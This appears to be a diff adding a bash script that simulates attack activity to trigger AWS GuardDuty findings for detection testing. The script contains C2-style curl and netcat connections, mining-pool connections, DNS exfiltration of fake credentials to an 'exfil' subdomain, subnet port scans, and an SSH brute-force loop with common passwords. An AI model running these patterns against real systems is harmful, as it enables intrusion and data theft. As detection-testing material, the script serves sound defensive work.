@@ -1,0 +1,186 @@
+#!/bin/bash
+
+# High-Impact GuardDuty Findings Simulation
+# These generate findings that typically trigger incident response
+
+echo "High-Impact GuardDuty Simulations"
+echo "================================="
+
+# 1. IMMEDIATE HIGH-SEVERITY FINDING
+# UnauthorizedAccess:EC2/MaliciousIPCaller.Custom
+simulate_immediate_threat() {
+    echo "[HIGH] Simulating communication with known C&C server..."
+    
+    # Known malicious domains that trigger immediate alerts
+    curl -m 5 "http://guarddutyc2activityb.com/test" 2>/dev/null || true
+    wget -T 5 -t 1 "http://malware-distribution.amazonaws.com/test" -O /dev/null 2>/dev/null || true
+    
+    # Multiple attempts to increase severity
+    for i in {1..5}; do
+        curl -m 3 "http://198.51.100.$((RANDOM % 10))" 2>/dev/null || true
+        sleep 2
+    done
+}
+
+# 2. CRYPTO MINING DETECTION
+# CryptoCurrency:EC2/BitcoinTool.B!DNS
+simulate_crypto_mining_advanced() {
+    echo "[HIGH] Simulating advanced cryptocurrency mining..."
+    
+    # Multiple mining pool connections
+    MINING_POOLS=(
+        "stratum+tcp://xmr-usa.dwarfpool.com:8005"
+        "stratum+tcp://pool.minergate.com:45700"
+        "stratum+tcp://mine.moneropool.com:3333"
+        "stratum+tcp://pool.supportxmr.com:5555"
+    )
+    
+    for pool in "${MINING_POOLS[@]}"; do
+        echo "Connecting to mining pool: $pool"
+        timeout 10 nc -w 3 $(echo $pool | cut -d'/' -f3 | cut -d':' -f1) $(echo $pool | cut -d':' -f3) < /dev/null 2>/dev/null || true
+        sleep 3
+    done
+    
+    # Simulate mining software behavior
+    echo "Simulating mining process..."
+    timeout 30 bash -c 'while true; do echo $RANDOM | sha256sum; done' > /dev/null &
+    MINING_PID=$!
+    sleep 15
+    kill $MINING_PID 2>/dev/null || true
+}
+
+# 3. DATA EXFILTRATION SIMULATION
+# Trojan:EC2/DNSDataExfiltration
+simulate_data_exfiltration() {
+    echo "[HIGH] Simulating data exfiltration via DNS..."
+    
+    # Generate fake sensitive data
+    FAKE_DATA=$(echo "password123:admin:$(date)" | base64 | tr -d '\n')
+    
+    # Break data into DNS queries
+    for i in $(seq 0 10 ${#FAKE_DATA}); do
+        CHUNK=${FAKE_DATA:$i:10}
+        if [ ! -z "$CHUNK" ]; then
+            QUERY="$CHUNK.exfil.guarddutyc2activityb.com"
+            echo "DNS exfiltration query: $QUERY"
+            nslookup "$QUERY" 8.8.8.8 2>/dev/null || true
+            sleep 1
+        fi
+    done
+}
+
+# 4. BACKDOOR ESTABLISHMENT
+# Backdoor:EC2/C&CActivity.B
+simulate_backdoor_advanced() {
+    echo "[HIGH] Simulating backdoor establishment..."
+    
+    # Multiple C&C server connections
+    C2_SERVERS=(
+        "198.51.100.1:4444"
+        "203.0.113.1:1337"
+        "198.51.100.2:8080"
+        "203.0.113.2:443"
+    )
+    
+    for server in "${C2_SERVERS[@]}"; do
+        IP=$(echo $server | cut -d':' -f1)
+        PORT=$(echo $server | cut -d':' -f2)
+        echo "Attempting C&C connection to $IP:$PORT"
+        
+        # Simulate various backdoor protocols
+        timeout 5 nc -w 2 "$IP" "$PORT" < /dev/null 2>/dev/null || true
+        timeout 5 bash -c "echo 'GET /beacon HTTP/1.1\r\nHost: $IP\r\n\r\n' | nc -w 2 $IP $PORT" 2>/dev/null || true
+        sleep 2
+    done
+}
+
+# 5. RECONNAISSANCE ACTIVITY
+# Recon:EC2/PortProbeUnprotectedPort
+simulate_reconnaissance() {
+    echo "[MEDIUM] Simulating network reconnaissance..."
+    
+    # Get VPC network range
+    LOCAL_IP=$(hostname -I | awk '{print $1}')
+    NETWORK=$(echo $LOCAL_IP | cut -d. -f1-3)
+    
+    echo "Scanning network: $NETWORK.0/24"
+    
+    # Aggressive port scanning
+    for target in {1..10}; do
+        TARGET_IP="$NETWORK.$((RANDOM % 254 + 1))"
+        echo "Port scanning $TARGET_IP"
+        
+        # Common vulnerable ports
+        timeout 10 nmap -p 21,22,23,25,53,80,110,443,993,995,1433,3306,3389,5432 "$TARGET_IP" 2>/dev/null || true
+        sleep 1
+    done
+}
+
+# 6. BRUTE FORCE ATTACK
+# UnauthorizedAccess:EC2/SSHBruteForce
+simulate_brute_force_advanced() {
+    echo "[HIGH] Simulating SSH brute force attack..."
+    
+    # Common usernames for brute force
+    USERS=(admin root user ubuntu ec2-user administrator guest test demo)
+    PASSWORDS=(admin 123456 password root user ubuntu)
+    
+    for user in "${USERS[@]}"; do
+        for pass in "${PASSWORDS[@]}"; do
+            echo "Attempting SSH: $user:$pass"
+            timeout 3 sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$user@localhost" "echo test" 2>/dev/null || true
+            sleep 0.5
+        done
+    done
+}
+
+# Main execution function
+run_high_impact_simulation() {
+    echo "WARNING: This will generate HIGH-SEVERITY GuardDuty findings!"
+    echo "Only run this in a test environment!"
+    echo ""
+    read -p "Continue? (yes/no): " confirm
+    
+    if [ "$confirm" != "yes" ]; then
+        echo "Simulation cancelled."
+        exit 0
+    fi
+    
+    echo ""
+    echo "Starting high-impact simulations..."
+    echo "Expected findings will appear in 5-15 minutes."
+    echo ""
+    
+    simulate_immediate_threat
+    sleep 30
+    
+    simulate_crypto_mining_advanced
+    sleep 30
+    
+    simulate_data_exfiltration
+    sleep 30
+    
+    simulate_backdoor_advanced
+    sleep 30
+    
+    simulate_reconnaissance
+    sleep 30
+    
+    # Install sshpass for brute force simulation
+    sudo apt install -y sshpass 2>/dev/null || true
+    simulate_brute_force_advanced
+    
+    echo ""
+    echo "High-impact simulation completed!"
+    echo "Check GuardDuty console for findings."
+    echo "Expected findings:"
+    echo "- UnauthorizedAccess:EC2/MaliciousIPCaller.Custom"
+    echo "- CryptoCurrency:EC2/BitcoinTool.B!DNS"
+    echo "- Trojan:EC2/DNSDataExfiltration"
+    echo "- Backdoor:EC2/C&CActivity.B"
+    echo "- Recon:EC2/PortProbeUnprotectedPort"
+    echo "- UnauthorizedAccess:EC2/SSHBruteForce"
+}
+
+# Run the simulation
+run_high_impact_simulation
